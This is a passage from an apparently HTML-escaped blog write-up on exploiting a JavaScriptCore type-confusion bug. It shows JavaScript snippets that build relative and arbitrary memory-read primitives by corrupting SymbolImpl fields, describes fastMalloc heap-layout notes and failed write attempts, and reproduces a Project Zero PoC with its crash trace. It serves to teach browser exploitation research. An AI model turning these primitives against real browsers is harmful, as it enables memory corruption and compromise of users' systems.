|0xffff|0xffff|refcount|length|str base ptr|
+------------------------------------------+
              ^
        +---+ |
        |ptr+-+
        +---+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The exact OOB values won’t matter, as long as they’re greater than the size of the &lt;code&gt;dst&lt;/code&gt; plus the &lt;code&gt;src&lt;/code&gt;. In this case, &lt;code&gt;resize&lt;/code&gt; in our pseudocode or &lt;code&gt;ensureLength&lt;/code&gt; (&lt;code&gt;[4]&lt;/code&gt;) in the actual code will not trigger a reallocation and object move, resulting in a direct &lt;code&gt;memcpy&lt;/code&gt; on top of &lt;code&gt;refcount&lt;/code&gt; and &lt;code&gt;length&lt;/code&gt;. From here, we can turn this into a relative read infoleak by overwriting the length field.&lt;/p&gt;
&lt;p&gt;For example, if we store a function reference to &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; in a variable named &lt;code&gt;busted_concat&lt;/code&gt; and then trigger the bug, like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x000042420000ffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

&lt;span class="nx"&gt;busted_concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note: &lt;code&gt;Int64&lt;/code&gt; can be found &lt;a href="https://github.com/saelo/jscpwn/blob/master/int64.js"&gt;here&lt;/a&gt; and is, of course, covered in &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We would then end up with a &lt;code&gt;Symbol&lt;/code&gt; &lt;code&gt;x&lt;/code&gt; with fields:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; refcount length
+----------------------------+
| 0x4242 |0xffff|str base ptr|
+----------------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;str base ptr&lt;/code&gt; will point to &lt;code&gt;AAAA&lt;/code&gt;, however instead of having a length of &lt;code&gt;4&lt;/code&gt;, it will have a length of &lt;code&gt;0xffff&lt;/code&gt;. To access this memory, we can extract the &lt;code&gt;String&lt;/code&gt; from a &lt;code&gt;Symbol&lt;/code&gt; with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1234&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;toString()&lt;/code&gt; in this case is actually kind of complicated under the hood. My understanding is that all strings in JSC are “roped”, meaning any existing substrings are linked together with pointers as opposed to linearly laid out in memory. However this detail doesn’t really affect us, for our purposes a string is created out of our controlled length and the existing string base pointer, with no terminating characters to be concerned with. It is possible to crash here if we were to index outside of mapped memory, but this hasn’t happened in my experience. As an additional minor complication, strings come in two varieties, 8bit and UTF-16. We can easily work around this with a basic heuristic: if we read any values larger than 255 we just assume it is a UTF-16 string.&lt;/p&gt;
&lt;p&gt;None of this changes the outcome of the snippet above, &lt;code&gt;leak&lt;/code&gt; now contains the contents of OOB memory. Boom, relative memory read :)&lt;/p&gt;
&lt;h3 id="oob-memory-is-a-zero"&gt;OOB Memory is a zero&lt;/h3&gt;
&lt;p&gt;On the other hand, let’s assume the OOB memory immediately before our target &lt;code&gt;SymbolImpl&lt;/code&gt; is all zeros. In this case, &lt;code&gt;resize&lt;/code&gt; / &lt;code&gt;ensureLength&lt;/code&gt; &lt;em&gt;will&lt;/em&gt; trigger a reallocation and object move. &lt;code&gt;ensureLength&lt;/code&gt; more or less corresponds to the following pseudocode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;new_btrfly&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;alloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_btrfly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_btrfly&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Or in words: if the existing butterfly isn’t large enough to hold a combination of the two butterflies, allocate a larger one, copy the existing butterfly contents into it, and assign it. Note that this does not actually do the concatenation, it just makes sure the destination will be large enough when the concatenation is actually performed.&lt;/p&gt;
&lt;p&gt;This turns out to also be quite useful to us, especially if we already have the relative read above. Assuming we have a &lt;code&gt;SymbolImpl&lt;/code&gt; starting at address &lt;code&gt;0x4008&lt;/code&gt; with a memory layout of:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;          OOB    OOB
        +------------------------------------------+
0x4000: |0x0000|0x0000|refcount|length|str base ptr|
        +------------------------------------------+
                      ^
                +---+ |
                |ptr+-+
                +---+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And, similar to the large value case above, we trigger the bug:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;read_target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0xdeadbeef&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x000042420000ffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;read_target&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

&lt;span class="nx"&gt;busted_concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We end up with a “&lt;code&gt;SymbolImpl&lt;/code&gt;” at a new address, &lt;code&gt;0x8000&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;         refcount length str base ptr
        +----------------------------+
0x8000: | 0x4242 |0xffff| 0xdeadbeef |
        +----------------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, we’ve managed to conjure a complete &lt;code&gt;SymbolImpl&lt;/code&gt;! We might not need to allocate a backing string for this Symbol (i.e. “AAAA”), but doing so can make it slightly easier to debug. The &lt;code&gt;ensureLength&lt;/code&gt; code basically decided to “resize” our &lt;code&gt;SymbolImpl&lt;/code&gt;, and by doing so allowed us to fully control the contents of a new one. This now means that if we do&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x5555&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will be dereferencing &lt;code&gt;*(0xdeadbeef + 0x5555)&lt;/code&gt;, giving us a completely arbitrary memory read. Obviously this depends on a relative leak, otherwise we wouldn’t have a valid mapped address to target. Additionally, we could have overwritten the &lt;code&gt;str base pointer&lt;/code&gt; in the non-zero length case (because the memcpy is based on the sizeof the source), but I found this method to be slightly more stable and repeatable.&lt;/p&gt;
&lt;p&gt;With this done we now have both relative and arbitrary infoleaks :)&lt;/p&gt;
&lt;h3 id="notes-on-fastmalloc"&gt;Notes on &lt;code&gt;fastMalloc&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;We will get into more detail on this in a second, however I want to cover how we control the first bytes prior the &lt;code&gt;SymbolImpl&lt;/code&gt;, as being able to control which &lt;code&gt;ensureLength&lt;/code&gt; codepath we hit is important (we need to get the relative leak before the absolute). This is partially where targeting &lt;code&gt;jsc&lt;/code&gt; instead of Webkit proper made my life easier: I had more or less deterministic heap layout for all of my runs, specifically:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// this symbol will always pass the ensureLength check&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// this symbol will always fail the ensureLength check&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;BBBB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To be honest, I didn’t find the root cause for why this was the case; I just ran with it. &lt;code&gt;SymbolImpl&lt;/code&gt; objects here are allocated via &lt;code&gt;fastMalloc&lt;/code&gt;, which seems to be used primarily by the JIT, &lt;code&gt;SymbolImpl&lt;/code&gt;, and &lt;code&gt;StringImpl&lt;/code&gt;. Additionally (and unfortunately) &lt;code&gt;fastMalloc&lt;/code&gt; is used by &lt;code&gt;print()&lt;/code&gt;, meaning if we were interested in porting our exploit from &lt;code&gt;jsc&lt;/code&gt; to WebKit we would likely have to redo most of the heap offsets (in addition to spraying to get control over the &lt;code&gt;ensureLength&lt;/code&gt; codepath).&lt;/p&gt;
&lt;p&gt;While this approach is untested, something like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;blink&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Will cause &lt;code&gt;AAAA&lt;/code&gt; to be allocated inline with the allocation metadata via &lt;code&gt;fastMalloc&lt;/code&gt;, as long as your target string is short enough. By spraying a few &lt;code&gt;blink&lt;/code&gt;’d objects to fill in any holes, it should be possible to to control &lt;code&gt;ensureLength&lt;/code&gt; and get the relative infoleak to make the absolute infoleak.&lt;/p&gt;
&lt;h2 id="arbitrary-write"&gt;Arbitrary Write&lt;/h2&gt;
&lt;p&gt;Let’s recap where we are, where we’re trying to go, and what’s left to do:&lt;/p&gt;
&lt;p&gt;We can now read and leak arbitrary browser memory.
We have a promising looking primitive for a memory write (the &lt;code&gt;memcpy&lt;/code&gt; in the case where we do not resize). 
If we can turn that relative memory write into an arbitrary write we can move on to targeting some vtables or saved program counters on the stack, and hijack control flow to win.&lt;/p&gt;
&lt;p&gt;How hard could this be?&lt;/p&gt;
&lt;h3 id="failure-nan-boxing"&gt;Failure: NaN boxing&lt;/h3&gt;
&lt;p&gt;One of the first ideas I had to get an arbitrary write was passing it a numeric value as the &lt;code&gt;dst&lt;/code&gt;. Our &lt;code&gt;busted_concat&lt;/code&gt; can be simplified to a weird version of &lt;code&gt;memcpy()&lt;/code&gt;, and instead of passing it &lt;code&gt;memcpy(Symbol, Array, size)&lt;/code&gt; could we pass it something like &lt;code&gt;memcpy(0x41414141, Array, size)&lt;/code&gt;? We would need to create an object at the address we passed in, but that shouldn’t be too difficult at this point: we have a good infoleak and the ability to instantiate memory with arbitrary values via &lt;code&gt;ArrayWithDouble&lt;/code&gt;. Essentially, this is asking if we can use this function reference to get us a &lt;code&gt;fakeobj()&lt;/code&gt; like primitive. There are basically two possibilities to try, and neither of them work.&lt;/p&gt;
&lt;p&gt;First, let’s take the integer case. If we pass &lt;code&gt;0x41414141&lt;/code&gt; as the &lt;code&gt;dst&lt;/code&gt; parameter, this will be encoded into a &lt;code&gt;JSValue&lt;/code&gt; of &lt;code&gt;0xffff000041414141&lt;/code&gt;. That’s a non-canonical address, and even if it weren’t, it would be in kernel space. Due to this integer tagging, it is impossible to get a JSValue that is an integer which is also a valid mapped memory address, so the integer path is out.&lt;/p&gt;
&lt;p&gt;Second, let’s examine what happens if we pass it a double instead: &lt;code&gt;memcpy(new Int64(0x41414141).asDouble(), Array, size)&lt;/code&gt;. In this case, the double should be using all 64 bits of the address, so it might be possible to construct a double who’s representation is a mapped memory location. However, JavaScriptCore handles this case as well: they use a floating point representation which has &lt;code&gt;0x0001000000000000&lt;/code&gt; added to the value when expressed as a &lt;code&gt;JSValue&lt;/code&gt;. This means, like integers, doubles can never correspond to a useful memory address.&lt;/p&gt;
&lt;p&gt;For more information on this, check out &lt;a href="https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/runtime/JSCJSValue.h#L365"&gt;this comment in JSCJSValue.h&lt;/a&gt; which explains the value tagging in more detail.&lt;/p&gt;
&lt;h3 id="failure-smashing-fastmalloc"&gt;Failure: Smashing fastMalloc&lt;/h3&gt;
&lt;p&gt;In creating our  relative read infoleak, we only overwrote the &lt;code&gt;refcount&lt;/code&gt; and &lt;code&gt;length&lt;/code&gt; fields of the target &lt;code&gt;SymbolImpl&lt;/code&gt;. However, this &lt;code&gt;memcpy&lt;/code&gt; should be significantly more useful to us: because the size of the copy is related to the size of the source, we can overwrite up to the OOB size field. Practically, this turns into an arbitrary overwrite of &lt;code&gt;SymbolImpl&lt;/code&gt;s.&lt;/p&gt;
&lt;p&gt;As mentioned previously, &lt;code&gt;SymbolImpl&lt;/code&gt; get allocated via &lt;code&gt;fastMalloc&lt;/code&gt;. To figure this out, we need to leave JSC and check out the Web Template Framework or WTF. WTF, for lack of a better analogy, forms a kind of stdlib for JSC to be built on top of it. If we look up &lt;code&gt;WTF::SymbolImpl&lt;/code&gt; from our class dump above, we find it in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/SymbolImpl.h#L34"&gt;&lt;code&gt;Source/WTF/wtf/text/SymbolImpl.h&lt;/code&gt;&lt;/a&gt;. Specifically, following the class declarations that are of interest to us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SymbolImpl&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;UniquedStringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/UniquedStringImpl.h#L35"&gt;&lt;code&gt;Source/WTF/wtf/text/UniquedStringImpl.h&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;UniquedStringImpl&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;StringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/StringImpl.h#L131"&gt;&lt;code&gt;/Source/WTF/wtf/text/StringImpl.h&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;StringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;WTF_MAKE_NONCOPYABLE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StringImpl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;WTF_MAKE_FAST_ALLOCATED&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;WTF_MAKE_FAST_ALLOCATED&lt;/code&gt; is a macro which expands to cause objects of this type to be allocated via &lt;code&gt;fastMalloc&lt;/code&gt;. This help forms our target list: anything that is tagged with &lt;code&gt;WTF_MAKE_FAST_ALLOCATED&lt;/code&gt;, or allocated directly via &lt;code&gt;fastMalloc&lt;/code&gt; is suitable, as long as we can force an allocation from the interpreter.&lt;/p&gt;
&lt;p&gt;To save some space: I was unsuccessful at finding any way to turn this &lt;code&gt;fastMalloc&lt;/code&gt; overflow into an arbitrary write. At one point I was absolutely convinced I had a method of partially overwriting a &lt;code&gt;SymbolImpl&lt;/code&gt;, converting it to a to String, then overwriting that, thus bypassing the flags restriction mentioned earlier... but this didn’t work (I confused &lt;code&gt;JSC::JSString&lt;/code&gt; with &lt;code&gt;WTF::StringImpl&lt;/code&gt;, amongst other problems).&lt;/p&gt;
&lt;p&gt;All the things I could find to overwrite in the &lt;code&gt;fastMalloc&lt;/code&gt; heap were either &lt;code&gt;String&lt;/code&gt;s (or &lt;code&gt;String&lt;/code&gt;-like things, e.g. &lt;code&gt;Symbol&lt;/code&gt;s) or were JIT primitives I didn’t want to try to understand. Alternatively I could have tried to target &lt;code&gt;fastMalloc&lt;/code&gt; metadata attacks -- for some reason this didn’t occur to me until much later and I haven’t looked at this at all.&lt;/p&gt;
&lt;p&gt;Remember when I mentioned the potential downsides of targeting &lt;code&gt;jsc&lt;/code&gt; specifically? This is where they start to come into play. It would be really nice at this point to have a richer set of objects to target here, specifically DOM or other browser objects. More objects would give me additional avenues on three fronts: more possibilities to type confuse my existing busted functions, more possibilities to overflow in the &lt;code&gt;fastMalloc&lt;/code&gt; heap, and more possibilities to obtain references to useful functions.&lt;/p&gt;
&lt;p&gt;At this point I decided to try to find a different chain of functions calls which would use the same bug but give me a reference to a different runtime function.&lt;/p&gt;
&lt;h2 id="control-flow"&gt;Control Flow&lt;/h2&gt;
&lt;p&gt;My general workflow when auditing other functions for our candidate pattern was to look at the code exposed via &lt;a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins"&gt;&lt;code&gt;builtins&lt;/code&gt;&lt;/a&gt;, find native functions, and then audit those native functions looking for things that had JSValue’s evaluated. While this found other instances of this pattern (e.g. in the RegExp code), they were not usable -- the C++ runtime functions would do additional checks and error out. However when searching, I stumbled onto another p0 bug with the same CVE attributed, &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1036"&gt;p0 bug 1036&lt;/a&gt;. Reproducing from the PoC there:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Intl&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;DateTimeFormat&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;format&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;valueOf&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This bug is very similar to our earlier bug and originally I was confused as to why it was a separate p0 bug. Both bugs manifest in the same way, by giving you a non-properly-typechecked reference to a function, however the root cause that makes the bugs possible is different. In the &lt;code&gt;appendMemcpy&lt;/code&gt; case this is due to a lack of checks on &lt;code&gt;use strict&lt;/code&gt; code. This appears to be a “regular” type confusion, unrelated to &lt;code&gt;use strict&lt;/code&gt;. These bugs, while different, are similar enough that they share a CVE and a fix.&lt;/p&gt;
&lt;p&gt;So, with this understood can we use &lt;code&gt;Intl.DateTimeFormat&lt;/code&gt; usefully to exploit &lt;code&gt;jsc&lt;/code&gt;?&lt;/p&gt;
&lt;h3 id="intldatetimeformat-crash"&gt;Intl.DateTimeFormat Crash&lt;/h3&gt;
&lt;p&gt;What’s the outcome if we run that PoC?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
…
$rdi   : 0xffff000077777777
...
 → 0x7ffff77a8960 &amp;lt;JSC::IntlDateTimeFormat::format(JSC::ExecState&amp;amp;,+0&amp;gt; cmp    BYTE PTR [rdi+0x18], 0x0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so we’re treating a NaN boxed integer as an object. What if we pass it an object instead?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// ...&lt;/span&gt;
